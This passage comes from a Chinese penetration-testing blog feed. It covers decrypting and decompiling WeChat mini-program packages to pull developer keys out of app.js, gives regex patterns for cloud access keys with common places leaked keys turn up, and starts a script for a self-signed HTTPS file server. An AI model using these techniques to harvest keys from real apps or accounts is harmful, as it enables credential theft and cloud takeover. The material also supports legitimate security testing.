      &lt;td style=&quot;text-align: center&quot;&gt;否&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;页面样式表&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;strong&gt;注意：为了方便开发者减少配置项，描述页面的四个文件必须具有相同的路径与文件名。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/image-20230708155906130.png&quot; alt=&quot;image-20230708155906130&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;重要文件-appjs&quot;&gt;重要文件 app.js&lt;/h2&gt;

&lt;p&gt;每个小程序都需要在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;app.js&lt;/code&gt; 中调用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;App()&lt;/code&gt; 方法注册小程序实例，绑定生命周期回调函数、错误监听和页面不存在监听函数等。&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// app.js&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;App&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;
  &lt;span class=&quot;nf&quot;&gt;onLaunch &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// Do something initial when launch.&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
  &lt;span class=&quot;nf&quot;&gt;onShow &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// Do something when show.&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
  &lt;span class=&quot;nf&quot;&gt;onHide &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// Do something when hide.&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
  &lt;span class=&quot;nf&quot;&gt;onError &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;globalData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;I am global data&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;整个小程序只有一个 App 实例，是全部页面共享的。开发者可以通过 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getApp()&lt;/code&gt; 方法获取到全局唯一的 App 实例，获取App上的数据或调用开发者注册在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;App.js&lt;/code&gt; 上的函数。&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// xxx.js&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;appInstance&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getApp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;appInstance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;globalData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// I am global data&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;获取app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;js中注册的globalData的数据&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;所以 &lt;strong&gt;app.js&lt;/strong&gt; 是我们需要重视的内容，很多开发者经常把一些api接口数据或者key写在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;globalData&lt;/code&gt;其中以便page页面进行调用访问，甚至为了调用云上的服务而把&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;access key&lt;/code&gt;写入其中，比如上面的e生活项目，就把个人调用服务的key写在了app.js。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/image-20230709001431848.png&quot; alt=&quot;image-20230709001431848&quot; style=&quot;zoom:67%;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;wxapkg文件&quot;&gt;.wxapkg文件&lt;/h2&gt;

&lt;p&gt;通常小程序编译后，生成&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.wxapkg&lt;/code&gt;文件，每次打开小程序时微信会自动缓存小程序的.wxapkg文件&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;wx的数据存储位置，默认在安装的目录下的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WeChat Files&lt;/code&gt;目录下&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/img/image-20230708213058997.png&quot; alt=&quot;image-20230708213058997&quot; style=&quot;zoom:67%;&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;小程序的位置在 WeChat Files\Applet目录下&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;每个文件夹就是个小程序，文件名其实就是wx+APPID，我们可以删除所有的文件再加载要测试的小程序，方便我们确定要反编译的小程序&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/image-20230709142750074.png&quot; alt=&quot;image-20230709142750074&quot; style=&quot;zoom:80%;&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;pc端小程序解密和反编译&quot;&gt;PC端小程序解密和反编译&lt;/h1&gt;

&lt;p&gt;对于最后拿到小程序的源码的过程，大致分为两步&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;wx小程序数据包解密&lt;/li&gt;
  &lt;li&gt;将解密后的数据包反编译得到源码&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;wx小程序多端代码基本差不多，PC端最方便，这里就以pc端为例&lt;/p&gt;

&lt;p&gt;​&lt;/p&gt;

&lt;h2 id=&quot;小程序数据解密&quot;&gt;小程序数据解密&lt;/h2&gt;

&lt;p&gt;解密思路参考，&lt;a href=&quot;https://bbs.kanxue.com/thread-276281.htm&quot;&gt;微信小程序逆向解密-软件逆向-看雪-安全社区&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;也可以使用代码果打包的gui，不要移动小程序包的位置，否则解密失败&lt;/p&gt;

&lt;p&gt;找到加密的小程序报的位置&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/image-20230709170625041.png&quot; alt=&quot;image-20230709170625041&quot; style=&quot;zoom:80%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;导入WeChat Files文件夹下的小程序数据，得到解密后的wx081d27880a575cb3.wxapkg&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/image-20230709122811488.png&quot; alt=&quot;image-20230709122811488&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;小程序数据反编译&quot;&gt;小程序数据反编译&lt;/h2&gt;

&lt;p&gt;拿到了解密后的小程序内容，还需要反编译得到我们可读的代码&lt;/p&gt;

&lt;p&gt;项目地址：&lt;a href=&quot;https://github.com/system-cpu/wxappUnpacker&quot;&gt;system-cpu/wxappUnpacker: 基于node反编译小程序 已经配置完成 (github.com)&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Windows用bingo.bat脚本批处理，wxapp是我们自己创建文件夹，把上面的到的wx081d27880a575cb3.wxapkg放在里面&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/image-20230709122916214.png&quot; alt=&quot;image-20230709122916214&quot; style=&quot;zoom:80%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;cmd运行，bingo.bat + 文件路径，直接把文件拖进cmd就行&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/image-20230709123149966.png&quot; alt=&quot;image-20230709123149966&quot; style=&quot;zoom:67%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;wxapp目录下生成和wx081d27880a575cb3同名的文件夹，反编译成功&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/image-20230709131553658.png&quot; alt=&quot;image-20230709131553658&quot; style=&quot;zoom:80%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;反编译得到的文件还需要我们进一步的挖掘, app.js文件中的 &lt;strong&gt;globalData&lt;/strong&gt; 就是我们常见的入口, 这里可能有开发者配置的key等, 如下&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/image-20230709165028911.png&quot; alt=&quot;image-20230709165028911&quot; style=&quot;zoom: 60%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;拿到代码后就各自发挥了: )&lt;/p&gt;
</description>
        <pubDate>Mon, 03 Jul 2023 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/vx%E5%B0%8F%E7%A8%8B%E5%BA%8F/2023/07/03/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-vx%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90%E5%92%8C%E5%8F%8D%E7%BC%96%E8%AF%91%E6%8B%BF%E6%BA%90%E7%A0%81.html</link>
        <guid isPermaLink="true">http://localhost:4000/vx%E5%B0%8F%E7%A8%8B%E5%BA%8F/2023/07/03/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-vx%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90%E5%92%8C%E5%8F%8D%E7%BC%96%E8%AF%91%E6%8B%BF%E6%BA%90%E7%A0%81.html</guid>
        
        
        <category>vx小程序</category>
        
      </item>
    
      <item>
        <title>云上-云上备忘录和杂学</title>
        <description>&lt;h1 id=&quot;文前漫谈&quot;&gt;文前漫谈&lt;/h1&gt;

&lt;p&gt;个人感觉，做云一定要简单看下云官方的SDK文档，也可以看别人产出总结出的文章。你看不懂的“黑话”，可能在官方的文档里都有详细的解释。&lt;/p&gt;

&lt;p&gt;对头部的云厂商是这样，私有云肯定也是。著名的CF框架，就是拿到AK后，从开发者的角度利用账户的权限对云上的主机进行批量操作，这本身也是云厂商给客户的正常功能。说白了就是我们接管，“帮运维干活”。&lt;/p&gt;

&lt;p&gt;本文记录和介绍云厂商通用概念、云上、学习SDK开发文档遇见的内容。&lt;/p&gt;

&lt;h1 id=&quot;access-key&quot;&gt;Access Key&lt;/h1&gt;

&lt;p&gt;为了保障云主机的安全性，各家云在API调用时均需要验证访问者的身份，以确保访问者具有相关权限。这种验证方式通过Access Key来实现，Access Key由用户自己创建，各家云颁发给云主机的所有者，它由Access Key ID和Access Key Secret构成，其重要性等同于用户的登录密码，代表了账号所有者的身份以及对应的权限。&lt;/p&gt;

&lt;p&gt;拿腾讯云举例，其他云厂商都差不多，访问路径：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;云产品 &amp;gt; 管理与审计 &amp;gt; 访问密钥 （From &lt;a href=&quot;https://www.cloudam.cn/help/docs/tencent/&quot;&gt;腾讯云  用户手册 (cloudam.cn)&lt;/a&gt;）&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/img/tx01-30ad4da68126029c6e9562538f9d8b77-1688299201660-3.png&quot; alt=&quot;tencent&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/tx02-85c88cdeb8809096752bc962cdb2c7e4-1688299219824-6.png&quot; alt=&quot;tencent&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;ak特征&quot;&gt;AK特征&lt;/h2&gt;

&lt;p&gt;CF 0.5.0版本已经开始引入查询AK所属云厂商的功能，qurery.go文件里&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/image-20230702194048125.png&quot; alt=&quot;image-20230702194048125&quot; style=&quot;zoom: 67%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;随便自己构造个，查询验证&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/image-20230702201510743.png&quot; alt=&quot;image-20230702201510743&quot; style=&quot;zoom:80%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在&lt;a href=&quot;https://jaimepolop.github.io/RExpository/&quot;&gt;RExpository (jaimepolop.github.io)&lt;/a&gt;统计有部分云厂商的AK特征，结合CF的正则匹配，写工具或者碰见时记得特征&lt;/p&gt;

&lt;p&gt;云厂商    AK正则表达式&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;阿里云    				^LTAI[0-9a-zA-Z]{20}$ &lt;br /&gt;
 腾讯云    				^AKID[0-9a-zA-Z]{32}$ &lt;br /&gt;
 百度云   				 ^ALTAK[0-9a-zA-Z]{21}$&lt;br /&gt;
 火山引擎				前缀为AKL             &lt;br /&gt;
 金山云				    ^AKLT[\w-]{20}$      &lt;br /&gt;
 京东云				    ^JDC_[0-9A-Z]{28}$    &lt;br /&gt;
 谷歌云 				   AIza[0-9A-Za-z_\-]{35}
 华为云				    ^[A-Z0-9]*$           &lt;br /&gt;
 七牛云				    ^[a-zA-Z0-9-_]{40}$   &lt;br /&gt;
 优刻得				    前缀为UCloud&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;何处觅ak&quot;&gt;何处觅AK？&lt;/h2&gt;

&lt;p&gt;正好碰见群友讨论，最常见的方式&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;github泄露&lt;/li&gt;
  &lt;li&gt;js文件硬编码&lt;/li&gt;
  &lt;li&gt;apk反编译&lt;/li&gt;
  &lt;li&gt;源代码泄露审计&lt;/li&gt;
  &lt;li&gt;通过传统web漏洞进而去翻配置文件【ssrf，文件读取】&lt;/li&gt;
  &lt;li&gt;nacos漏洞进后台找&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;还有比较独特的姿势？比较新奇一点的&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Nacos漏洞 public空间配置文件&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;SprintBoot未授权 heapdump&lt;/li&gt;
  &lt;li&gt;微信小程序反编译&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;p&gt;未完……&lt;/p&gt;

</description>
        <pubDate>Mon, 12 Jun 2023 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/%E4%BA%91%E5%AE%89%E5%85%A8/2023/06/12/%E4%BA%91%E4%B8%8A-%E4%BA%91%E4%B8%8A%E5%A4%87%E5%BF%98%E5%BD%95%E5%92%8C%E6%9D%82%E5%AD%A6.html</link>
        <guid isPermaLink="true">http://localhost:4000/%E4%BA%91%E5%AE%89%E5%85%A8/2023/06/12/%E4%BA%91%E4%B8%8A-%E4%BA%91%E4%B8%8A%E5%A4%87%E5%BF%98%E5%BD%95%E5%92%8C%E6%9D%82%E5%AD%A6.html</guid>
        
        
        <category>云安全</category>
        
      </item>
    
      <item>
        <title>渗透技巧——用python简单起个https服务器</title>
        <description>&lt;blockquote&gt;
  &lt;p&gt;文章首发于&lt;a href=&quot;https://xz.aliyun.com/t/12605&quot;&gt;用python简单起个https服务器 - 先知社区 (aliyun.com)&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;前言&quot;&gt;前言&lt;/h1&gt;

&lt;p&gt;偶然碰见的很有意思的内容&lt;/p&gt;

&lt;p&gt;平时我们经常有起个http服务器的需求，一般是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python -m http.server port&lt;/code&gt;，很明显，这样的文件下载时是明文传输的&lt;/p&gt;

&lt;p&gt;访问本地起的http服务&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/image-20230613140607581.png&quot; alt=&quot;image-20230613140607581&quot; /&gt;&lt;/p&gt;

&lt;p&gt;wireshark捕获下，http的内容是直接可见的&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/image-20230613140735449.png&quot; alt=&quot;image-20230613140735449&quot; style=&quot;zoom: 67%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这时候考虑加个网站ssl证书把http &amp;gt; https，也就是自签名，反正也是访问我们自己的服务，下面是python代码实现，小改动自，&lt;a href=&quot;https://ohyicong.medium.com/how-to-create-a-https-server-with-one-liner-of-code-655e7e28ccd&quot;&gt;Yicong – Medium&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;自己可以根据需求改动签名中的信息，比如甩锅啥的&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# Python 3
# Usage: python3 SimpleHTTPSServer.py
&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OpenSSL&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;crypto&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SSL&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gethostname&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pprint&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pprint&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gmtime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mktime&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http.server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ssl&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argparse&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argparse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;ArgumentParser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;SimpleHTTPSServer &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; Usage: python3 SimpleHTTPSServer.py 443&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;add_argument&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;443&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nargs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;help&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Port Number, default is 443&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;parse_args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;CERT_PATH&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;server.crt&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;KEY_PATH&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;server.key&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;PEM_PATH&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;server.pem&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;create_self_signed_cert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cert_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pem_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# create a key pair
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;crypto&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;PKey&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;generate_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;crypto&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TYPE_RSA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;# create a self-signed cert
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;cert&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;crypto&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;X509&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;cert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get_subject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;C&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;UK&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;cert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get_subject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ST&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;London&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;cert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get_subject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;London&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;cert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get_subject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;O&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Dummy Company Ltd&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;
